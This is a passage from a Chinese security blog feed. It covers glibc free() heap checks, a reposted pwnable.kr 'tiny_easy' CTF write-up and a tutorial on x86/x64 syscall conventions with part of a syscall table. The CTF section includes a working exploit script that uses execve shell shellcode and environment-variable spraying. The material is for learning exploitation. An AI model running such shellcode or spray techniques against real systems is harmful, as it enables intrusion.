href="#3-大小为fastbin的情况-不改变inuse位" class="headerlink" title="3.大小为fastbin的情况(不改变inuse位)"></a>3.大小为fastbin的情况(不改变inuse位)</h3><figure class="highlight irpf90"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs irpf90"><span class="hljs-number">1</span>).检查下一个chunk的<span class="hljs-built_in">size</span>：<span class="hljs-number">2</span>*size_t&lt;chunk_size&lt;内存总分配量<br><span class="hljs-number">2</span>).<span class="hljs-keyword">double</span> <span class="hljs-keyword">free</span>检查：<br>    检查当前<span class="hljs-keyword">free</span>的chunk是否与fastbin中的第一个chunk相同，相同则报错<br><br></code></pre></td></tr></table></figure><p>简单的小例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">char</span> *a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>    <span class="hljs-type">char</span> *b=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">free</span>(a);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>报错</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">char</span> *a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>    <span class="hljs-type">char</span> *b=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">free</span>(b);<br>    <span class="hljs-built_in">free</span>(a);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>没问题</p><h3 id="4-其他情况"><a href="#4-其他情况" class="headerlink" title="4.其他情况"></a>4.其他情况</h3><figure class="highlight irpf90"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs irpf90"><span class="hljs-number">1</span>).检查下一个chunk的<span class="hljs-built_in">size</span>：<span class="hljs-number">2</span>*size_t&lt;chunk_size&lt;内存总分配量<br>    如果当前 chunk 为 sbrk()分配，那么它相邻的下一块 chunk 超过了分配区的地址，会报错<br><span class="hljs-number">2</span>).<span class="hljs-keyword">double</span> <span class="hljs-keyword">free</span>检查：<br>    检查当前<span class="hljs-keyword">free</span>的chunk是否为top chunk，是则报错<br>    根据下一块的inuse标识检查当前<span class="hljs-keyword">free</span>的chunk是否已被<span class="hljs-keyword">free</span><br><span class="hljs-number">3</span>) unlink合并：<br>    检查前后chunk是否<span class="hljs-keyword">free</span>，然后向后（top chunk方向）合并，并改变对应的inuse标志位<br>    unlink检查： I.当前chunk的<span class="hljs-built_in">size</span>是否等于下一chunk的prev_size<br>                II.P-&gt;bk-&gt;fd == P &amp;&amp; P-&gt;bk-&gt;fd == P<br>    如果合并后 chunk_size &gt; <span class="hljs-number">64</span>bytes,则调用函数合并fastbin中的chunk到unsortedbin中<br>    将合并后的chunk加入unsortedbin<br><span class="hljs-number">4</span>) unsortedbin检查<br>    需要检查 unsortedbin的第一个chunk的bk是否指向unsortedbin<br><br></code></pre></td></tr></table></figure><p>我们可以看到，针对free的检查主要是下一块的size和inuse位，另外fastbin的检查可以用来做double free。</p><h2 id="0×05"><a href="#0×05" class="headerlink" title="0×05"></a>0×05</h2><p>以上就是对堆的情况所做的一些介绍，了解堆的保护机制后，我们便可以在攻击时想办法进行绕过，从而构造出那些光怪陆离的payload。</p><p>*<strong>本文原创作者：hellowuzekai，属于FreeBuf奖励计划，禁止转载</strong></p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>程序执行中我们所忽略的事</title>
    <link href="/2023/11/09/%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E4%B8%AD%E6%88%91%E4%BB%AC%E6%89%80%E5%BF%BD%E7%95%A5%E7%9A%84%E4%BA%8B/"/>
    <url>/2023/11/09/%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E4%B8%AD%E6%88%91%E4%BB%AC%E6%89%80%E5%BF%BD%E7%95%A5%E7%9A%84%E4%BA%8B/</url>
    
    <content type="html"><![CDATA[<h4 id="1、程序执行时argv-0-一定会是程序名或者程序绝对路径吗？"><a href="#1、程序执行时argv-0-一定会是程序名或者程序绝对路径吗？" class="headerlink" title="1、程序执行时argv[0]一定会是程序名或者程序绝对路径吗？"></a>1、程序执行时argv[0]一定会是程序名或者程序绝对路径吗？</h4><p>这个问题可能让绝大多数人困惑，因为我们所看到的基本上都符合这个结论。那什么情况下不符合呢？</p><p>这就不得不提到我做过的pwnable.kr上的tiny_easy一题了</p><blockquote><p>I made a pretty difficult pwn task.<br>However I also made a dumb rookie mistake and made it too easy :(<br>This is based on real event :) enjoy.</p><p>ssh <a href="mailto:&#116;&#x69;&#x6e;&#x79;&#x5f;&#x65;&#97;&#115;&#x79;&#x40;&#x70;&#119;&#110;&#97;&#98;&#108;&#x65;&#46;&#107;&#x72;">&#116;&#x69;&#x6e;&#x79;&#x5f;&#x65;&#97;&#115;&#x79;&#x40;&#x70;&#119;&#110;&#97;&#98;&#108;&#x65;&#46;&#107;&#x72;</a> -p2222 (pw:guest)</p></blockquote><p>程序主体就一下几行:</p><blockquote><p>pop     eax<br>pop     edx<br>mov     edx, [edx]<br>call    edx</p></blockquote><p>那么eax其实是参数个数，而edx则是argv[0]所在字符串的前4位组成的32位地址</p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><br>jumpto = <span class="hljs-string">&quot;\xb0\xaf\xb5\xff&quot;</span><br>shellcode = <span class="hljs-string">&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>nopsled = <span class="hljs-string">&quot;\x90&quot;</span>*<span class="hljs-number">4096</span>;<br>payload = nopsled+shellcode<br><br>myenv = &#123;&#125;<br><span class="hljs-comment"># Arbitrary largeish number</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>):<br>    myenv[<span class="hljs-string">&quot;spray&quot;</span>+<span class="hljs-built_in">str</span>(i)] = payload<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = subprocess.Popen([jumpto], executable=<span class="hljs-string">&quot;tiny_easy&quot;</span>, env=myenv)<br>    p.wait()<br></code></pre></td></tr></table></figure><p>脚本很简单，利用的是类堆喷的方法。</p><p>这里subprocess.Popen(args, executable&#x3D;None, env&#x3D;None)</p><p>其实args这个list中的第一个参数是argv[0]，而执行的程序则是executable对应的elf文件。可以发现<font color=#f00>用户可以控制程序执行时argv[0]</font></p><p>当然除了subprocess有这个功能，pwntools中pwnlib.tubes.process.process(<em>args</em>, <em>shell &#x3D; False</em>, <em>executable &#x3D; None</em>, <em>env &#x3D; None</em>, <em>timeout &#x3D; ‘default’</em>, <em>log_level &#x3D; INFO</em>)也可以有类似的操作</p><h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p><a href="https://introspelliam.github.io/">本文章装载于此</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>系统调用约定</title>
    <link href="/2023/11/09/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/"/>
    <url>/2023/11/09/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/</url>
    
    <content type="html"><![CDATA[<h3 id="1、windows-64位调用约定"><a href="#1、windows-64位调用约定" class="headerlink" title="1、windows 64位调用约定"></a>1、windows 64位调用约定</h3><p>windows64 位的调用很是奇怪，因为它不是通过栈来传参，而是通过寄存器来传参！</p><p>最为常见的是，当参数只有一个的时候，一般是选用rcx来传递参数！</p><h3 id="2、Linux-64位调用约定"><a href="#2、Linux-64位调用约定" class="headerlink" title="2、Linux 64位调用约定"></a>2、Linux 64位调用约定</h3><p>其实32位系统调用，我们在<a href="/2017/08/07/int-80h%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95/">int-80h系统调用方法</a>已经有过讲述。现在，我们将要讨论的是64位的系统调用。不过在此之前，我们需要知道linux的两个有关系统调用的重要文件unistd_32.h和unistd_64.h，这两个文件定义了系统调用号！</p><h4 id="2-1-每种调用号需要传递哪些参数"><a href="#2-1-每种调用号需要传递哪些参数" class="headerlink" title="2.1 每种调用号需要传递哪些参数"></a>2.1 每种调用号需要传递哪些参数</h4><p>在linux系统中某个程序执行时进行的系统调用可以通过strace命令来查看，solaris中对应的命令为dtrace，而mac os x中可以通过类似的dtruss命令来查看。当进程已经处于 D 状态（uninterruptible sleep）时，strace 也帮不上忙。这时候可以通过:</p><blockquote><p>cat &#x2F;proc&#x2F;<PID>&#x2F;syscall</p></blockquote><p>来查看。（详细内容可以到<a href="http://www.jb51.net/article/50923.htm">http://www.jb51.net/article/50923.htm</a>查看)</p><p>32位的系统调用表的参数可以到 <a href="http://syscalls.kernelgrok.com/">http://syscalls.kernelgrok.com/</a> 查找；关于32位系统中使用汇编语言调用syscall table，将在另一篇博文[linux下32位汇编的系统调用]中详述。</p><p>而在64位系统中，大神说了：可以通过grep在源代码中查找： </p><p>To find the implementation of a system call, grep the kernel tree for SYSCALL_DEFINE.?(syscall,</p><p>For example, to find the read system call:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">illusion:<span class="hljs-regexp">/usr/</span>src/linux-<span class="hljs-keyword">source</span>-<span class="hljs-number">3.19</span>$ <span class="hljs-keyword">grep</span> -rA3 <span class="hljs-string">&#x27;SYSCALL_DEFINE.\?(read,&#x27;</span> *<br>fs/read_write.c:SYSCALL_DEFINE3(<span class="hljs-keyword">read</span>, unsigned <span class="hljs-keyword">int</span>, fd, <span class="hljs-keyword">char</span> __user *, buf, size_t, <span class="hljs-keyword">count</span>)<br>fs/read_write.c-&#123;<br>fs/read_write.c-        struct <span class="hljs-keyword">file</span> *<span class="hljs-keyword">file</span>;<br>fs/read_write.c-        ssize_t ret = -EBADF;<br></code></pre></td></tr></table></figure><p>也可以在以下网址中查找：<br><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64&#x2F;</a></p><h4 id="2-2-调用如何传递参数以及结果如何返回"><a href="#2-2-调用如何传递参数以及结果如何返回" class="headerlink" title="2.2 调用如何传递参数以及结果如何返回"></a>2.2 调用如何传递参数以及结果如何返回</h4><p>在64位linux中，一般来说系统调用的参数统统放在寄存器中，最多可以用到6个寄存器；如果多余6个参数的系统调用怎么传递参数？这个还不清楚，有的文档说64位系统调用的参数最多不会超过6个；还有的文档说超过6个参数的话，其余参数全部通过堆栈来传递。超过6个参数的系统调用，本猫没有实际碰到，也不知到底该怎么办！?就这个问题，有兴趣的童鞋可以和本猫单独切磋讨论。</p><p>具体调用规则如下： </p><ol><li><p>用户模式的系统调用依次传递的寄存器为: </p><p><strong>rdi，rsi，rdx，rcx，r8和r9</strong> </p></li><li><p>内核接口的系统调用一次传递的寄存器为: </p><p><strong>rdi，rsi，rdx，r10，r8和r9</strong></p><p><strong>注意这里和用户模式的系统调用只有第4个寄存器不同，其他都相同。</strong> </p></li><li><p><strong>系统调用通过syscall指令进入，不像32位下的汇编使用的是int 0x80指令；</strong> </p></li><li><p>系统调用号放在rax寄存器里； </p></li><li><p>系统调用限制最多6个参数，没有参数直接通过栈传递，原话是:</p></li></ol><blockquote><p>System-calls are limited to six arguments, no argument is passed directly on the stack</p></blockquote><ol start="6"><li>系统调用的返回结果，也就是syscall指令的返回放在rax寄存器中； </li><li>只有整形值和内存型的值可以传递给内核，这个也不十分明白，原话是:</li></ol><blockquote><p>Only values of class INTEGER or class MEMORY are passed to the kernel</p></blockquote><p>有的童鞋可能要问了，要是浮点数怎么传递给接口！？有参数是浮点数的系统调用吗？这个还真不清楚，不过参数是浮点数的C标准库函数的调用那是大大的有，这个等到在另一篇博文[64汇编调用C标准库函数]中再详细给大家解答。</p><h3 id="3、Linux系统调用实例"><a href="#3、Linux系统调用实例" class="headerlink" title="3、Linux系统调用实例"></a>3、Linux系统调用实例</h3><p>代码的功能很简单，显示一行文本，然后退出。我们使用了syscall中的write和exit调用，查一下前面的调用号和参数，我们初步总结如下：</p><p>write(即sys_write)调用号为1，需传递3个参数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf<br><span class="hljs-type">size_t</span> count<br></code></pre></td></tr></table></figure><p>exit(sys_exit)调用号为60，只需传递一个错误码</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span> error_code<br></code></pre></td></tr></table></figure><p>如果该值为0表示程序执行成功。</p><p>因为以上两个调用最多的也只有3个参数，所以我们依次只会用到3个寄存器rdi,rsi和rdx。 </p><p>实际代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br>;if use ld<br>global _start<br>;if use gcc<br>;global main<br>_start:<br>;main<br>    mov rax,1       ;write NO<br>    mov rdi,1       ;fd<br>    mov rsi,msg     ;addr of msg string<br>    mov rdx,msg_len ;lenght of msg string<br>    syscall<br><br>    mov rax,60      ;exit NO<br>    mov rdi,0       ;error_code<br>    syscall<br><br>    msg: db &quot;Hello World!&quot;,0xa<br>    msg_len:equ $-msg<br></code></pre></td></tr></table></figure><p>编译连接命令如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nasm -f elf64 <span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.s</span><br>ld -o <span class="hljs-selector-tag">p</span> <span class="hljs-selector-tag">p</span>.o<br></code></pre></td></tr></table></figure><p>如果是mac os x系统下命令如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nasm -f macho64 <span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.s</span><br>ld -o <span class="hljs-selector-tag">p</span> <span class="hljs-selector-tag">p</span>.o<br></code></pre></td></tr></table></figure><p>如果你要生成32位的代码，在编译时把elf64改为elf32就可以了，不过我前面说过：32位和64位汇编结构变化较大，光改这个是没办法运行成功的。 </p><p>不出所料代码运行输出一行:Hello World！并且程序返回后用echo $?看，应该为0.</p><p>这个例子很简单，下面看一下稍微复杂点的调用:mmap,该调用共有6个参数，我们再一次总结如下：<br>mmap(sys_mmap) 系统调用号为9，参数分别为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> prot<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> fd<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> offset<br></code></pre></td></tr></table></figure><p>第一个参数是需要映射到的地址，我们这里传0，表示不关心映射到哪；第二个参数是映射空间的大小；第三个参数表示映射区域的保护方式，有很多种，我们这里只让它可读可写即可，所以只用到2者的组合： </p><p>PROT_WRITE|PROT_READ </p><p>第四个参数是映射区域的一些特性，有很多组合。这里只用MAP_SHARED|MAP_ANONYMOUS,后者表示建立匿名映射，会忽略参数fd，所以不设及文件。 </p><p>第五个参数就是fd，前面说了可以忽略，所以我们传递-1；最后一个参数是映射的偏移量，我们也传递0. </p><p>该调用如果成功返回映射区域内存的起始地址，否则返回MAP_FAILED（-1）,错误原因存于errno中，我们可以用strerror(errno)查看具体含义。不过该函数是C库中的，这里我们捎带的用一下。</p><p>提到mmap我们不得不提到munmap，用猜大家也知道该调用的含义吧： </p><p>munmap(sys_munmap) 调用号为11,需传递2个参数:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start<br><span class="hljs-type">size_t</span> len<br></code></pre></td></tr></table></figure><h3 id="4、附录"><a href="#4、附录" class="headerlink" title="4、附录"></a>4、附录</h3><h4 id="4-1-32系统调用表"><a href="#4-1-32系统调用表" class="headerlink" title="4.1 32系统调用表"></a>4.1 32系统调用表</h4><table><thead><tr><th>#</th><th>Name</th><th>Registers</th><th>Definition</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td>eax</td><td>ebx</td><td>ecx</td><td>edx</td><td>esi</td><td>edi</td><td></td></tr><tr><td>0</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/restart_syscall.2.html">sys_restart_syscall</a></td><td>0x00</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2058">kernel&#x2F;signal.c:2058</a></td></tr><tr><td>1</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/exit.2.html">sys_exit</a></td><td>0x01</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1046">kernel&#x2F;exit.c:1046</a></td></tr><tr><td>2</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fork.2.html">sys_fork</a></td><td>0x02</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19">struct pt_regs *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L716">arch&#x2F;alpha&#x2F;kernel&#x2F;entry.S:716</a></td></tr><tr><td>3</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/read.2.html">sys_read</a></td><td>0x03</td><td>unsigned int fd</td><td>char __user *buf</td><td>size_t count</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L391">fs&#x2F;read_write.c:391</a></td></tr><tr><td>4</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/write.2.html">sys_write</a></td><td>0x04</td><td>unsigned int fd</td><td>const char __user *buf</td><td>size_t count</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L408">fs&#x2F;read_write.c:408</a></td></tr><tr><td>5</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/open.2.html">sys_open</a></td><td>0x05</td><td>const char __user *filename</td><td>int flags</td><td>int mode</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L900">fs&#x2F;open.c:900</a></td></tr><tr><td>6</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/close.2.html">sys_close</a></td><td>0x06</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L969">fs&#x2F;open.c:969</a></td></tr><tr><td>7</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/waitpid.2.html">sys_waitpid</a></td><td>0x07</td><td>pid_t pid</td><td>int __user *stat_addr</td><td>int options</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1771">kernel&#x2F;exit.c:1771</a></td></tr><tr><td>8</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/creat.2.html">sys_creat</a></td><td>0x08</td><td>const char __user *pathname</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L933">fs&#x2F;open.c:933</a></td></tr><tr><td>9</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/link.2.html">sys_link</a></td><td>0x09</td><td>const char __user *oldname</td><td>const char __user *newname</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2520">fs&#x2F;namei.c:2520</a></td></tr><tr><td>10</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unlink.2.html">sys_unlink</a></td><td>0x0a</td><td>const char __user *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2352">fs&#x2F;namei.c:2352</a></td></tr><tr><td>11</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html">sys_execve</a></td><td>0x0b</td><td>char __user *</td><td>char __user *__user *</td><td>char __user *__user *</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19">struct pt_regs *</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L925">arch&#x2F;alpha&#x2F;kernel&#x2F;entry.S:925</a></td></tr><tr><td>12</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chdir.2.html">sys_chdir</a></td><td>0x0c</td><td>const char __user *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L361">fs&#x2F;open.c:361</a></td></tr><tr><td>13</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/time.2.html">sys_time</a></td><td>0x0d</td><td>time_t __user *tloc</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L855">kernel&#x2F;posix-timers.c:855</a></td></tr><tr><td>14</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mknod.2.html">sys_mknod</a></td><td>0x0e</td><td>const char __user *filename</td><td>int mode</td><td>unsigned dev</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2067">fs&#x2F;namei.c:2067</a></td></tr><tr><td>15</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chmod.2.html">sys_chmod</a></td><td>0x0f</td><td>const char __user *filename</td><td>mode_t mode</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L507">fs&#x2F;open.c:507</a></td></tr><tr><td>16</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lchown16.2.html">sys_lchown16</a></td><td>0x10</td><td>const char __user *filename</td><td>old_uid_t user</td><td>old_gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L27">kernel&#x2F;uid16.c:27</a></td></tr><tr><td>17</td><td>not implemented</td><td>0x11</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>18</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/stat.2.html">sys_stat</a></td><td>0x12</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/stat.h?v=2.6.35#L4">struct __old_kernel_stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L150">fs&#x2F;stat.c:150</a></td></tr><tr><td>19</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lseek.2.html">sys_lseek</a></td><td>0x13</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int origin</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L167">fs&#x2F;read_write.c:167</a></td></tr><tr><td>20</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpid.2.html">sys_getpid</a></td><td>0x14</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1337">kernel&#x2F;timer.c:1337</a></td></tr><tr><td>21</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mount.2.html">sys_mount</a></td><td>0x15</td><td>char __user *dev_name</td><td>char __user *dir_name</td><td>char __user *type</td><td>unsigned long flags</td><td>void __user *data</td><td><a href="http://lxr.free-electrons.com/source/fs/namespace.c?v=2.6.35#L2118">fs&#x2F;namespace.c:2118</a></td></tr><tr><td>22</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/oldumount.2.html">sys_oldumount</a></td><td>0x16</td><td>char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namespace.c?v=2.6.35#L1171">fs&#x2F;namespace.c:1171</a></td></tr><tr><td>23</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setuid16.2.html">sys_setuid16</a></td><td>0x17</td><td>old_uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L67">kernel&#x2F;uid16.c:67</a></td></tr><tr><td>24</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getuid16.2.html">sys_getuid16</a></td><td>0x18</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L212">kernel&#x2F;uid16.c:212</a></td></tr><tr><td>25</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/stime.2.html">sys_stime</a></td><td>0x19</td><td>time_t __user *tptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/time.c?v=2.6.35#L81">kernel&#x2F;time.c:81</a></td></tr><tr><td>26</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ptrace.2.html">sys_ptrace</a></td><td>0x1a</td><td>long request</td><td>long pid</td><td>long addr</td><td>long data</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/ptrace.c?v=2.6.35#L688">kernel&#x2F;ptrace.c:688</a></td></tr><tr><td>27</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/alarm.2.html">sys_alarm</a></td><td>0x1b</td><td>unsigned int seconds</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a 